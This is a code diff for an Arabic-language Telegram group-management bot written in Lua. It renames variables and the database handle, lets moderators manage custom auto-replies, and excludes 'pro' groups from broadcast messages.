 local anemi = redis:get('MohaMeD:'..bot_id.."sudo:add:reply1:gif"..text)   
 local veico = redis:get('MohaMeD:'..bot_id.."sudo:add:reply1:vico"..text)   
 local stekr = redis:get('MohaMeD:'..bot_id.."sudo:add:reply1:stekr"..text)     
@@ -1002,30 +902,30 @@ local voice_caption = (redis:get('MohaMeD:'..bot_id.."sudo:addreply1:voice:capti
 ------------------------------------------------------------------------
 if text1 then 
 function MohaMeD_re(t1,t2)
-local tahna = (database:get('MohaMeD:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
-local user_msgs = ((database:get('MohaMeD:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_) or 0) + tahna)
-local edit = database:get('MohaMeD:'..bot_id..'user:editmsg'..msg.chat_id_..':'..msg.sender_user_id_) or 0
+local tahna = (datahmade:get('MohaMeD:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
+local user_msgs = ((datahmade:get('MohaMeD:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_) or 0) + tahna)
+local edit = datahmade:get('MohaMeD:'..bot_id..'user:editmsg'..msg.chat_id_..':'..msg.sender_user_id_) or 0
 local t = ""
 if msg.sender_user_id_ == tonumber(sudo_add) then
 t = 'المطور الاساسي'
 elseif is_sudo(msg) then
-t = database:get("MohaMeD:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت '
+t = datahmade:get("MohaMeD:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت '
 elseif is_creatorbasic(msg) then
-t = database:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي '
-elseif (database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("MohaMeD:all_sl:"..database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
-t = database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
+t = datahmade:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي '
+elseif (datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and datahmade:get("MohaMeD:all_if:"..datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
+t = datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
 elseif is_creator(msg) then
-t = database:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب '
-elseif (database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("MohaMeD:all_sl:"..database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
-t = database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
+t = datahmade:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب '
+elseif (datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and datahmade:get("MohaMeD:all_if:"..datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
+t = datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
 elseif is_owner(msg) then
-t = database:get("MohaMeD:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب '
+t = datahmade:get("MohaMeD:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب '
 elseif is_mod(msg) then
-t = database:get("MohaMeD:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب'
+t = datahmade:get("MohaMeD:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب'
 elseif is_vip(msg) then
-t = database:get("MohaMeD:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز '
+t = datahmade:get("MohaMeD:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز '
 else
-t = database:get("MohaMeD:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط ' 
+t = datahmade:get("MohaMeD:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط ' 
 end
 local text1 = text1:gsub('#username',(t2.username_ or 'لا يوجد')) 
 local text1 = text1:gsub('#name',(t2.first_name_ or 'لا يوجد'))
@@ -1060,8 +960,8 @@ sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil,photo,photo_caption)
 end  
 end
 
-if text == ("مسح ردود المدير") and is_owner(msg) then
-local list = redis:smembers('MohaMeD:'..bot_id..'kekore'..msg.chat_id_..'')
+if text == ("مسح ردود المدير") and is_mod(msg) then
+local list = redis:smembers('MohaMeD:'..bot_id..'ahmadre'..msg.chat_id_..'')
 for k,v in pairs(list) do
 redis:del('MohaMeD:'..bot_id.."add:reply1:gif"..v..msg.chat_id_)   
 redis:del('MohaMeD:'..bot_id.."add:reply1:vico"..v..msg.chat_id_)   
@@ -1071,13 +971,13 @@ redis:del('MohaMeD:'..bot_id.."addreply1:photo:gp"..v..msg.chat_id_)
 redis:del('MohaMeD:'..bot_id.."addreply1:video:gp"..v..msg.chat_id_)
 redis:del('MohaMeD:'..bot_id.."addreply1:document:gp"..v..msg.chat_id_)
 redis:del('MohaMeD:'..bot_id.."addreply1:audio:gp"..v..msg.chat_id_)
-redis:del('MohaMeD:'..bot_id..'kekore'..msg.chat_id_..'')
+redis:del('MohaMeD:'..bot_id..'ahmadre'..msg.chat_id_..'')
 end
 send(msg.chat_id_, msg.id_, 1, "• `تم مسح ردود المدير` 🗑", 1, 'md')
 end
 
-if text == ("ردود المدير") and is_owner(msg) then
-local list = redis:smembers('MohaMeD:'..bot_id..'kekore'..msg.chat_id_..'')
+if text == ("ردود المدير") and is_mod(msg) then
+local list = redis:smembers('MohaMeD:'..bot_id..'ahmadre'..msg.chat_id_..'')
 text = "📑┇قائمه ردود المدير\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
 for k,v in pairs(list) do
 if redis:get('MohaMeD:'..bot_id.."add:reply1:gif"..v..msg.chat_id_) then
@@ -1109,11 +1009,11 @@ end
 send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
 end
 if text or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ or msg.content_.audio_ or msg.content_.document_ or msg.content_.photo_ or msg.content_.video_ then  
-local keko1 = redis:get('MohaMeD:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'')
+local ahmad1 = redis:get('MohaMeD:'..bot_id..'ahmad1'..msg.sender_user_id_..''..msg.chat_id_..'')
 local test = redis:get('MohaMeD:'..bot_id..'msg'..msg.sender_user_id_..''..msg.chat_id_..'')
-if keko1 == 're' then
+if ahmad1 == 're' then
 send(msg.chat_id_, msg.id_, 1, '☑┇تم حفظ الرد', 1, 'md')
-redis:set('MohaMeD:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'', 'no')
+redis:set('MohaMeD:'..bot_id..'ahmad1'..msg.sender_user_id_..''..msg.chat_id_..'', 'no')
 if msg.content_.sticker_ then   
 redis:set('MohaMeD:'..bot_id.."add:reply1:stekr"..test..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_)  
 end   
@@ -1126,10 +1026,6 @@ redis:set('MohaMeD:'..bot_id.."add:reply1:gif"..test..msg.chat_id_, msg.content_
 redis:set('MohaMeD:'..bot_id.."addreply1:animation:caption:gp"..test..msg.chat_id_,(msg.content_.caption_ or ''))  
 end  
 if text then   
-text = text:gsub('"','') 
-text = text:gsub("'",'') 
-text = text:gsub('`','') 
-text = text:gsub('*','') 
 redis:set('MohaMeD:'..bot_id.."add:reply:rd"..test..msg.chat_id_, text)  
 end  
 if msg.content_.audio_ then
@@ -1164,10 +1060,10 @@ return false
 end  
 end
 if text and text:match("^(.*)$") then
-local keko1 = redis:get('MohaMeD:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'')
-if keko1 == 'msg' then
+local ahmad1 = redis:get('MohaMeD:'..bot_id..'ahmad1'..msg.sender_user_id_..''..msg.chat_id_..'')
+if ahmad1 == 'msg' then
 send(msg.chat_id_, msg.id_, 1, '📥┇الان ارسل الرد الذي تريد اضافته \n📥┇ قد يكون (ملف - فديو - نص - ملصق - بصمه - متحركه )\n☑┇ يمكنك اضافه الى النص :\n- `#username` > اسم المستخدم\n- `#msgs` > عدد رسائل المستخدم\n- `#name` > اسم المستخدم\n- `#id` > ايدي المستخدم\n- `#stast` > موقع المستخدم \n- `#edit` > عدد السحكات  ', 1, 'md')
-redis:set('MohaMeD:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'', 're')
+redis:set('MohaMeD:'..bot_id..'ahmad1'..msg.sender_user_id_..''..msg.chat_id_..'', 're')
 redis:set('MohaMeD:'..bot_id..'msg'..msg.sender_user_id_..''..msg.chat_id_..'', text)
 redis:del('MohaMeD:'..bot_id.."add:reply1:gif"..text..msg.chat_id_)   
 redis:del('MohaMeD:'..bot_id.."add:reply1:vico"..text..msg.chat_id_)   
@@ -1177,12 +1073,12 @@ redis:del('MohaMeD:'..bot_id.."addreply1:photo:gp"..text..msg.chat_id_)
 redis:del('MohaMeD:'..bot_id.."addreply1:video:gp"..text..msg.chat_id_)
 redis:del('MohaMeD:'..bot_id.."addreply1:document:gp"..text..msg.chat_id_)
 redis:del('MohaMeD:'..bot_id.."addreply1:audio:gp"..text..msg.chat_id_)
-redis:sadd('MohaMeD:'..bot_id..'kekore'..msg.chat_id_..'', text)
+redis:sadd('MohaMeD:'..bot_id..'ahmadre'..msg.chat_id_..'', text)
 return false end
 end
 if text and text:match("^(.*)$") then
-local keko1 = redis:get('MohaMeD:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'')
-if keko1 == 'nomsg' then
+local ahmad1 = redis:get('MohaMeD:'..bot_id..'ahmad1'..msg.sender_user_id_..''..msg.chat_id_..'')
+if ahmad1 == 'nomsg' then
 send(msg.chat_id_, msg.id_, 1, '☑┇تم حذف الرد', 1, 'md')
 redis:del('MohaMeD:'..bot_id.."add:reply1:gif"..text..msg.chat_id_)   
 redis:del('MohaMeD:'..bot_id.."add:reply1:vico"..text..msg.chat_id_)   
@@ -1192,22 +1088,22 @@ redis:del('MohaMeD:'..bot_id.."addreply1:photo:gp"..text..msg.chat_id_)
 redis:del('MohaMeD:'..bot_id.."addreply1:video:gp"..text..msg.chat_id_)
 redis:del('MohaMeD:'..bot_id.."addreply1:document:gp"..text..msg.chat_id_)
 redis:del('MohaMeD:'..bot_id.."addreply1:audio:gp"..text..msg.chat_id_)
-redis:del('MohaMeD:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'')
-redis:srem('MohaMeD:'..bot_id..'kekore'..msg.chat_id_..'', text)
+redis:del('MohaMeD:'..bot_id..'ahmad1'..msg.sender_user_id_..''..msg.chat_id_..'')
+redis:srem('MohaMeD:'..bot_id..'ahmadre'..msg.chat_id_..'', text)
 return false
 end
 end
-if text == 'اضف رد' and is_owner(msg) then
+if text == 'اضف رد' and is_mod(msg) then
 send(msg.chat_id_, msg.id_, 1, '📜┇ ارسل الكلمة التي تريد اضافتها ', 1, 'md')
-redis:set('MohaMeD:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'', 'msg')
+redis:set('MohaMeD:'..bot_id..'ahmad1'..msg.sender_user_id_..''..msg.chat_id_..'', 'msg')
 return false 
 end
-if text == 'حذف رد' and is_owner(msg) then
+if text == 'حذف رد' and is_mod(msg) then
 send(msg.chat_id_, msg.id_, 1, '📜┇ ارسل الكلمة التي تريد حذفها ', 1, 'md')
-redis:set('MohaMeD:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'', 'nomsg')
+redis:set('MohaMeD:'..bot_id..'ahmad1'..msg.sender_user_id_..''..msg.chat_id_..'', 'nomsg')
 return false 
 end
-if text and not database:get('MohaMeD:'..bot_id..'repowner:mute'..msg.chat_id_) then
+if text and not datahmade:get('MohaMeD:'..bot_id..'repowner:mute'..msg.chat_id_) then
 local anemi = redis:get('MohaMeD:'..bot_id.."add:reply1:gif"..text..msg.chat_id_)   
 local veico = redis:get('MohaMeD:'..bot_id.."add:reply1:vico"..text..msg.chat_id_)   
 local stekr = redis:get('MohaMeD:'..bot_id.."add:reply1:stekr"..text..msg.chat_id_)     
@@ -1226,30 +1122,30 @@ local voice_caption = (redis:get('MohaMeD:'..bot_id.."addreply1:voice:caption:gp
 ------------------------------------------------------------------------
 if text1 then 
 function MohaMeD_re(t1,t2)
-local tahna = (database:get('MohaMeD:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
-local user_msgs = ((database:get('MohaMeD:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_) or 0) + tahna)
-local edit = database:get('MohaMeD:'..bot_id..'user:editmsg'..msg.chat_id_..':'..msg.sender_user_id_) or 0
+local tahna = (datahmade:get('MohaMeD:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
+local user_msgs = ((datahmade:get('MohaMeD:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_) or 0) + tahna)
+local edit = datahmade:get('MohaMeD:'..bot_id..'user:editmsg'..msg.chat_id_..':'..msg.sender_user_id_) or 0
 local t = ""
 if msg.sender_user_id_ == tonumber(sudo_add) then
 t = 'المطور الاساسي'
 elseif is_sudo(msg) then
-t = database:get("MohaMeD:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت '
+t = datahmade:get("MohaMeD:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت '
 elseif is_creatorbasic(msg) then
-t = database:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي '
-elseif (database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("MohaMeD:all_sl:"..database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
-t = database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
+t = datahmade:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي '
+elseif (datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and datahmade:get("MohaMeD:all_if:"..datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
+t = datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
 elseif is_creator(msg) then
-t = database:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب '
-elseif (database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("MohaMeD:all_sl:"..database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
-t = database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
+t = datahmade:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب '
+elseif (datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and datahmade:get("MohaMeD:all_if:"..datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
+t = datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
 elseif is_owner(msg) then
-t = database:get("MohaMeD:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب '
+t = datahmade:get("MohaMeD:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب '
 elseif is_mod(msg) then
-t = database:get("MohaMeD:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب'
+t = datahmade:get("MohaMeD:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب'
 elseif is_vip(msg) then
-t = database:get("MohaMeD:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز '
+t = datahmade:get("MohaMeD:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز '
 else
-t = database:get("MohaMeD:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط ' 
+t = datahmade:get("MohaMeD:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط ' 
 end
 local text1 = text1:gsub('#username',(t2.username_ or 'لا يوجد')) 
 local text1 = text1:gsub('#name',(t2.first_name_ or 'لا يوجد'))
@@ -1285,15 +1181,15 @@ end
 end
 
 ------------------------------------------------------------------------
-if database:get('MohaMeD:'..bot_id.."bc:in:pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) and is_sudo(msg) then 
+if datahmade:get('MohaMeD:'..bot_id.."bc:in:pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) and is_sudo(msg) then 
 if text and text:match("^الغاء$") or text and text:match("^الغاء ✖$") then   
 send(msg.chat_id_, msg.id_, 1, "*📬┇ تم الغاء الاذاعه للمشتركين *\n", 1, "md") 
-database:del('MohaMeD:'..bot_id.."bc:in:pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
+datahmade:del('MohaMeD:'..bot_id.."bc:in:pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
 else 
-local gps = database:scard('MohaMeD:'..bot_id.."userss") or 0 
+local gps = datahmade:scard('MohaMeD:'..bot_id.."userss") or 0 
 if msg.content_.text_ then
 whatbc = 'الرساله'
-local list = database:smembers('MohaMeD:'..bot_id..'userss') 
+local list = datahmade:smembers('MohaMeD:'..bot_id..'userss') 
 for k,v in pairs(list) do 
 send(v, 0, 1, '[ '..msg.content_.text_..' ]', 1, 'md')  
 end
@@ -1304,158 +1200,108 @@ photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
 elseif msg.content_.photo_.sizes_[1] then
 photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
 end
-local list = database:smembers('MohaMeD:'..bot_id..'userss') 
+local list = datahmade:smembers('MohaMeD:'..bot_id..'userss') 
 for k,v in pairs(list) do 
 tdcli.sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
 end 
 elseif msg.content_.animation_ then
 whatbc = 'المتحركه'
-local list = database:smembers('MohaMeD:'..bot_id..'userss') 
+local list = datahmade:smembers('MohaMeD:'..bot_id..'userss') 
 for k,v in pairs(list) do 
 tdcli.sendDocument(v, 0,0, 1, nil, msg.content_.animation_.animation_.persistent_id_)
 end 
 elseif msg.content_.sticker_ then
 whatbc = 'الملصق'
-local list = database:smembers('MohaMeD:'..bot_id..'userss') 
+local list = datahmade:smembers('MohaMeD:'..bot_id..'userss') 
 for k,v in pairs(list) do 
 tdcli.sendSticker(v, 0,0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)
 end 
 end
 send(msg.chat_id_, msg.id_, 1, '☑┇تم نشر الرساله الى {'..(gps)..'} مشترك ', 1, 'md')
-database:del('MohaMeD:'..bot_id.."bc:in:pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
+datahmade:del('MohaMeD:'..bot_id.."bc:in:pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
 end 
 return false
 end 
 ------------------------------------------------------------------------
-if database:get("MohaMeD:set_if_bc_new:"..bot_id..msg.sender_user_id_) and is_sudo(msg) then  
-database:del("MohaMeD:set_if_bc_new:"..bot_id..msg.sender_user_id_)
-local pro = database:scard('MohaMeD:'..bot_id..'pro:groups') or 0
+if datahmade:get("MohaMeD:set_if_bc_new:"..bot_id..msg.sender_user_id_) and is_sudo(msg) then  
+datahmade:del("MohaMeD:set_if_bc_new:"..bot_id..msg.sender_user_id_)
+local pro = datahmade:scard('MohaMeD:'..bot_id..'pro:groups') or 0
 if text then 
-local gpss = database:smembers( 'MohaMeD:'..bot_id.."groups") or 0
+local gpss = datahmade:smembers( 'MohaMeD:'..bot_id.."groups") or 0
 for i=1, #gpss do
+if not datahmade:sismember('MohaMeD:'..bot_id..'pro:groups', gpss[i]) then
 send(gpss[i], 0, 1, text, 1, 'html')		
 end					
 end
+end
 if (data.message_.content_.sticker_) then 
-gpss = database:smembers( 'MohaMeD:'..bot_id.."groups") or 0
+gpss = datahmade:smembers( 'MohaMeD:'..bot_id.."groups") or 0
 for i=1, #gpss do
+if not datahmade:sismember('MohaMeD:'..bot_id..'pro:groups', gpss[i]) then
 tdcli.sendSticker(gpss[i], 0,0, 1, nil, data.message_.content_.sticker_.sticker_.persistent_id_)
 end
+end
 elseif (data.message_.content_.voice_) then 
-gpss = database:smembers( 'MohaMeD:'..bot_id.."groups") or 0
+gpss = datahmade:smembers( 'MohaMeD:'..bot_id.."groups") or 0
 for i=1, #gpss do
+if not datahmade:sismember('MohaMeD:'..bot_id..'pro:groups', gpss[i]) then
 tdcli.sendVoice(gpss[i], 0,0, 1, nil, data.message_.content_.voice_.voice_.persistent_id_)
 end
+end
 elseif (data.message_.content_.video_) then 
-gpss = database:smembers( 'MohaMeD:'..bot_id.."groups") or 0
+gpss = datahmade:smembers( 'MohaMeD:'..bot_id.."groups") or 0
 for i=1, #gpss do
+if not datahmade:sismember('MohaMeD:'..bot_id..'pro:groups', gpss[i]) then
 tdcli.sendVideo(gpss[i], 0,0, 1, nil, data.message_.content_.video_.video_.persistent_id_)
 end
+end
 elseif (data.message_.content_.animation_) then 
-gpss = database:smembers( 'MohaMeD:'..bot_id.."groups") or 0
+gpss = datahmade:smembers( 'MohaMeD:'..bot_id.."groups") or 0
 for i=1, #gpss do
+if not datahmade:sismember('MohaMeD:'..bot_id..'pro:groups', gpss[i]) then
 tdcli.sendDocument(gpss[i], 0,0, 1, nil, data.message_.content_.animation_.animation_.persistent_id_)
 end
+end
 elseif (data.message_.content_.document_) then
-gpss = database:smembers( 'MohaMeD:'..bot_id.."groups") or 0
+gpss = datahmade:smembers( 'MohaMeD:'..bot_id.."groups") or 0
 for i=1, #gpss do
+if not datahmade:sismember('MohaMeD:'..bot_id..'pro:groups', gpss[i]) then
 tdcli.sendDocument(gpss[i], 0,0, 1, nil, data.message_.content_.document_.document_.persistent_id_)
 end
+end
 elseif (data.message_.content_.photo_) then
-local id_keko = nil
+local id_ahmad = nil
 if data.message_.content_.photo_.sizes_[0] then
-id_keko = data.message_.content_.photo_.sizes_[0].photo_.persistent_id_
+id_ahmad = data.message_.content_.photo_.sizes_[0].photo_.persistent_id_
 end
 if data.message_.content_.photo_.sizes_[1] then
-id_keko = data.message_.content_.photo_.sizes_[1].photo_.persistent_id_
+id_ahmad = data.message_.content_.photo_.sizes_[1].photo_.persistent_id_
 end
 if data.message_.content_.photo_.sizes_[2] then
-id_keko = data.message_.content_.photo_.sizes_[2].photo_.persistent_id_
+id_ahmad = data.message_.content_.photo_.sizes_[2].photo_.persistent_id_
 end	
 if data.message_.content_.photo_.sizes_[3] then
-id_keko = data.message_.content_.photo_.sizes_[3].photo_.persistent_id_
+id_ahmad = data.message_.content_.photo_.sizes_[3].photo_.persistent_id_
 end
-gpss = database:smembers( 'MohaMeD:'..bot_id.."groups") or 0
+gpss = datahmade:smembers( 'MohaMeD:'..bot_id.."groups") or 0
 for i=1, #gpss do
-tdcli.sendPhoto(gpss[i], 0, 0, 1, nil, id_keko,(msg.content_.caption_ or " "))					
-end
-end
-gpss = database:smembers( 'MohaMeD:'..bot_id.."groups") or 0
-send(msg.chat_id_, msg.id_, 1, '☑┇تم نشر الرساله في {'..(#gpss)..'} مجموعه ', 1, 'md')
-return false
-end
-------------------------------------------------------------------------
-if database:get("MohaMeD:set_if_bc_new:pin"..bot_id..msg.sender_user_id_) and is_sudo(msg) then  
-database:del("MohaMeD:set_if_bc_new:pin"..bot_id..msg.sender_user_id_)
-local pro = database:scard('MohaMeD:'..bot_id..'pro:groups') or 0
-if text then 
-local gpss = database:smembers( 'MohaMeD:'..bot_id.."groups") or 0
-for i=1, #gpss do
-send(gpss[i], 0, 1, text, 1, 'html')	
-database:set('MohaMeD:'..bot_id..'Msg_Text'..gpss[i],text) 
+if not datahmade:sismember('MohaMeD:'..bot_id..'pro:groups', gpss[i]) then
+tdcli.sendPhoto(gpss[i], 0, 0, 1, nil, id_ahmad,(msg.content_.caption_ or " "))
 end					
 end
-if (data.message_.content_.sticker_) then 
-print(data.message_.content_.sticker_.sticker_.persistent_id_)
-gpss = database:smembers( 'MohaMeD:'..bot_id.."groups") or 0
-for i=1, #gpss do
-tdcli.sendSticker(gpss[i], 0,0, 1, nil, data.message_.content_.sticker_.sticker_.persistent_id_)
-database:set('MohaMeD:'..bot_id..'Msg_Text'..gpss[i],data.message_.content_.sticker_.sticker_.persistent_id_) 
 end
-elseif (data.message_.content_.voice_) then 
-gpss = database:smembers( 'MohaMeD:'..bot_id.."groups") or 0
-for i=1, #gpss do
-tdcli.sendVoice(gpss[i], 0,0, 1, nil, data.message_.content_.voice_.voice_.persistent_id_)
-database:set('MohaMeD:'..bot_id..'Msg_Text'..gpss[i],data.message_.content_.voice_.voice_.persistent_id_) 
-end
-elseif (data.message_.content_.video_) then 
-gpss = database:smembers( 'MohaMeD:'..bot_id.."groups") or 0
-for i=1, #gpss do
-tdcli.sendVideo(gpss[i], 0,0, 1, nil, data.message_.content_.video_.video_.persistent_id_)
-database:set('MohaMeD:'..bot_id..'Msg_Text'..gpss[i],data.message_.content_.video_.video_.persistent_id_) 
-end
-elseif (data.message_.content_.animation_) then 
-gpss = database:smembers( 'MohaMeD:'..bot_id.."groups") or 0
-for i=1, #gpss do
-tdcli.sendDocument(gpss[i], 0,0, 1, nil, data.message_.content_.animation_.animation_.persistent_id_)
-database:set('MohaMeD:'..bot_id..'Msg_Text'..gpss[i],data.message_.content_.animation_.animation_.persistent_id_) 
-end
-elseif (data.message_.content_.document_) then
-gpss = database:smembers( 'MohaMeD:'..bot_id.."groups") or 0
-for i=1, #gpss do
-tdcli.sendDocument(gpss[i], 0,0, 1, nil, data.message_.content_.document_.document_.persistent_id_)
-database:set('MohaMeD:'..bot_id..'Msg_Text'..gpss[i],data.message_.content_.document_.document_.persistent_id_) 
-end
-elseif (data.message_.content_.photo_) then
-local id_keko = nil
-if data.message_.content_.photo_.sizes_[0] then
-id_keko = data.message_.content_.photo_.sizes_[0].photo_.persistent_id_
-end
-if data.message_.content_.photo_.sizes_[1] then
-id_keko = data.message_.content_.photo_.sizes_[1].photo_.persistent_id_
-end
-if data.message_.content_.photo_.sizes_[2] then
-id_keko = data.message_.content_.photo_.sizes_[2].photo_.persistent_id_
-end	
-if data.message_.content_.photo_.sizes_[3] then
-id_keko = data.message_.content_.photo_.sizes_[3].photo_.persistent_id_
-end
-gpss = database:smembers( 'MohaMeD:'..bot_id.."groups") or 0
-for i=1, #gpss do
-tdcli.sendPhoto(gpss[i], 0, 0, 1, nil, id_keko,(msg.content_.caption_ or " "))		
-database:set('MohaMeD:'..bot_id..'Msg_Text'..gpss[i],id_keko) 
-end
-end
-gpss = database:smembers( 'MohaMeD:'..bot_id.."groups") or 0
-send(msg.chat_id_, msg.id_, 1, '☑┇تم نشر الرساله في {'..(#gpss)..'} مجموعه ', 1, 'md')
+gpss = datahmade:smembers( 'MohaMeD:'..bot_id.."groups") or 0
+send(msg.chat_id_, msg.id_, 1, '☑┇تم نشر الرساله في {'..(#gpss - pro)..'} مجموعه ', 1, 'md')
 return false
 end
 ------------------------------------------------------------------------
 
 ------------------------------------------------------------------------
+
+------------------------------------------------------------------------
 if text and text:match("^(.*)$") then
-local keko2 = redis:get('MohaMeD:'..bot_id..'texts'..msg.sender_user_id_..'')
-if keko2 == 'msg' then
+local ahmad2 = redis:get('MohaMeD:'..bot_id..'texts'..msg.sender_user_id_..'')
+if ahmad2 == 'msg' then
 send(msg.chat_id_, msg.id_, 1, '☑┇تم حفظ الكليشه يمكنك اظهارها بارسال الامر', 1, 'html')
 redis:set('MohaMeD:'..bot_id..'texts'..msg.sender_user_id_..'', 'no')
 redis:set('MohaMeD:'..bot_id..'text_sudo', text)
@@ -1465,8 +1311,8 @@ end
 end
 ------------------------------------------------------------------------
 if text and text:match("^(.*)$") then
-local keko2 = redis:get('MohaMeD:'..bot_id..'textst'..msg.sender_user_id_..'')
-if keko2 == 'msg' then
+local ahmad2 = redis:get('MohaMeD:'..bot_id..'textst'..msg.sender_user_id_..'')
+if ahmad2 == 'msg' then
 send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ تم حفظ الاسم ', 1, 'html')
 redis:set('MohaMeD:'..bot_id..'textst'..msg.sender_user_id_..'', 'no')
 redis:set('MohaMeD:'..bot_id..'name_bot', text)
@@ -1475,60 +1321,60 @@ end
 end
 ------------------------------------------------------------------------
 if text and text:match("^+(.*)$") then
-local kekoo = redis:get('MohaMeD:'..bot_id..'sudoo'..text..'')
-local keko2 = redis:get('MohaMeD:'..bot_id..'nkeko'..msg.sender_user_id_..'')
-if keko2 == 'msg' then
+local ahmado = redis:get('MohaMeD:'..bot_id..'sudoo'..text..'')
+local ahmad2 = redis:get('MohaMeD:'..bot_id..'nahmad'..msg.sender_user_id_..'')
+if ahmad2 == 'msg' then
 send(msg.chat_id_, msg.id_, 1, '• `الان يمكنك ارسال الاسم الذي تريده` 🏷', 1, 'md')
-redis:set('MohaMeD:'..bot_id..'nmkeko', text)
-redis:set('MohaMeD:'..bot_id..'nkeko'..msg.sender_user_id_..'', 'mmsg')
+redis:set('MohaMeD:'..bot_id..'nmahmad', text)
+redis:set('MohaMeD:'..bot_id..'nahmad'..msg.sender_user_id_..'', 'mmsg')
 return false 
 end
 end
 ------------------------------------------------------------------------
 if text and text:match("^(.*)$") then
